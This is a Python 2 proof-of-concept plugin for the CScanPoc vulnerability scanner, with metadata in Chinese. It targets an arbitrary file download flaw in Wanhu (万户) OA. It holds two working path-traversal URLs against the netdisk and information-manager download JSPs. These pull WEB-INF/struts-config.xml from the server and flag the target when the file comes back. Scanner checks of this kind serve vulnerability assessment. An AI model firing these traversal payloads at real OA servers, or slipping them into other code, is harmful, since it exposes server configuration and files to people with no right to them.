# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'whezeip_0007' # 平台漏洞编号，留空
    name = '万户OA多处无限制任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-09-21'  # 漏洞公布时间
    desc = '''
        万户OA多处无限制任意文件下载
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=065752' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '万户oa'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'whezeip_0007' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads=["/defaultroot/netdisk/download_netdisk.jsp?path=1&fileName=../../WEB-INF/struts-config&fileExtName=xml&fileSaveName=file","defaultroot/information_manager/informationmanager_download.jsp?path=..&FileName=WEB-INF/struts-config.xml&name=file"]
            for payload in payloads:
                target=arg+payload
                code, head, res, errcode, _ = hh.http(target)
                if code==200 and '<struts-config>' in res and 'filename=\"file\"' in head:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()